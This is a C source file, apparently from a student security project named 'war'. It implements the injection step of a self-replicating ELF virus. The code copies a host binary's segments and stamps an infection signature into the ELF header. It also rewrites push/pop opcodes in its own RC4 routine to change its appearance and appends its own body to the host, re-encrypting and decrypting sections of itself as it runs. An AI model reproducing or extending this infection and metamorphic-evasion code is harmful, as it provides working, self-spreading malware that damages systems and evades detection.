/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/08 15:49:30 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Inject -> follow the step.
*/

void		inject(t_data *data)
{
#ifdef DEBUG
	char de[] = "inject\t0\n";
	data->context == true ?	de[7] = 49 : 0;
	_write(1, de, _strlen(de));
#endif

	revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);

	if (data->context == false || data->context != true)
		goto next;
	data->context = false;

	int				size = data->virus.size + data->virus.note->p_offset;
	uint8_t			*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	if (map == MAP_FAILED)
		goto next;

	register int	off = 0;
	int				lim = 0;
	uint8_t			*dst = map;
	uint8_t			*src = data->bin.map;

	//	step 1 : copy original data
	lim = data->virus.data->p_offset + data->virus.data->p_filesz;
	while (off < lim)
	{
		*dst++ = *src++;
		off++;
	}

	// step 2 : insert signature
	data->header = (Elf64_Ehdr*)map;
	*(uint32_t*)&data->header->e_ident[EI_PAD] = SIGNATURE;

	// step 3 : MORE SIGNATURE
	lim = data->virus.note->p_offset;
	for (register int i = 0 ; i < CREATE_SZ ; i++)
	{
		*dst++ = CREATED_BY[i];
		off++;
	}

	// step 4 : padding
	while (off < lim)
	{
		*dst++ = 0;
		off++;
	}

	// step 5 : metamorph rc4()
	uint16_t oc[OC_ENTRY] = {
		0x5850, // rax
		0x5951, // rcx
		0x5a52,	// rdx
		0x5b53, // rbx
		0x5e56, // rsi
		0x5f57,	// rdi
		0x5c54,	// rsp
		0x5d55	// rbp
	};

	uint8_t *r4 = (uint8_t*)_rc4;
	lim = (size_t)end_of_data - (size_t)r4;
	while (lim > 0)
	{
		for (register int i = 0 ; i < OC_ENTRY ; i++)
		{
			if (oc[i] == *(uint16_t*)r4)
			{
				*(uint16_t*)r4 = oc[_random_number(OC_ENTRY)];
				r4++;
				break ;
			}
		}
		r4++;
		lim--;
	}

	// step 5 : inject itself
	uint8_t *beg = (uint8_t*)start;
	for (register int i = 0 ; i < (int)data->virus.size ; i++)
	{
		*dst++ = *beg++;
		off++;
	}
	data->context = true;

next:
	update_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
	revert_one(&data->key, (char*)patch, (size_t)release - (size_t)patch);
	patch(data, map, size);
}
